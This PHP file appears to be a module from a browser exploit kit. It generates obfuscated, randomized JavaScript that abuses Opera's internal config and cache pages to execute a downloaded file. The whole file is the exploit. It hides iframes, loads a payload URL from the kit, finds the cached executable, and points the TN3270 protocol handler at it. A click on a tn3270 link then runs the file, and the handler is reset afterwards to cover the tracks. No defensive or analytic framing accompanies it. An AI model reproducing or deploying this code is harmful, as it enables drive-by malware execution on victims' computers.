<?php
/**
 *
 * @	Version			:	1.1.7.0
 * @	Author			:	DrWhat
 * @	Release on		:	25.02.2013
 *
 */

if ($browser == 'op') {
	$randVar = $GLOBALS['cpFunctions']->CreateArrayString( rand( 10, 30 ), '100' );
	$strUrl = $GLOBALS['cpXplHelper']->GetURL( 'other', $browser, $os, 'TN3270' );
	$exploitName = 'opera';
	$functionName = $ExploitFunctions[9];
	$eArray[] = '
	function ' . $functionName . '(){
		' . $randVar[0] . ' = document.createElement(\'iframe\');
		' . $randVar[0] . '.src = \'about:blank\';
		' . $randVar[0] . '.setAttribute(\'id\', \'' . $randVar[1] . '\');
		' . $randVar[0] . '.setAttribute(\'style\', \'display:none\');
		document.appendChild(' . $randVar[0] . ');
		' . $randVar[1] . '.eval
			("' . $randVar[2] . ' = document.createElement(\'iframe\');\
			' . $randVar[2] . '.setAttribute(\'id\', \'' . $randVar[8] . '\');\
			' . $randVar[2] . '.src = \'opera:config\';\
			document.appendChild(' . $randVar[2] . ');\
			' . $randVar[3] . ' = document.createElement(\'script\');\
			' . $randVar[4] . ' = document.createElement(\'iframe\');\
			' . $randVar[3] . '.src = \'' . $strUrl . '\';\
			' . $randVar[3] . '.onload = function ()\
			{\
				' . $randVar[4] . '.src = \'opera:cache\';\
				' . $randVar[4] . '.onload = function ()\
				{\
					' . $randVar[5] . ' = ' . $randVar[4] . '.contentDocument.childNodes[0].innerHTML.toUpperCase();\
					var ' . $randVar[6] . ' = new RegExp(\'(OPR\\\\w{5}.EXE)</TD>\\\\s*<TD>\\\\d+</TD>\\\\s*<TD><A HREF=\"\'+' . $randVar[3] . '.src.toUpperCase(), \'\');\
					' . $randVar[7] . ' = ' . $randVar[5] . '.match(' . $randVar[6] . ');\
					' . $randVar[8] . '.eval\
					(\"\
					opera.setPreference(\'Network\',\'TN3270 App\',opera.getPreference(\'User Prefs\',\'Cache Directory4\')+parent.' . $randVar[7] . '[1]);\
					' . $randVar[9] . ' = document.createElement(\'a\');\
					' . $randVar[9] . '.setAttribute(\'href\', \'tn3270://nothing\');\
					' . $randVar[9] . '.click();\
					setTimeout(function () {opera.setPreference(\'Network\',\'TN3270 App\',\'telnet.exe\')},1000);\
					\");\
				};\
				document.appendChild(' . $randVar[4] . ');\
			};\
			document.appendChild(' . $randVar[3] . ');");
			{next}
	}';
}

?>
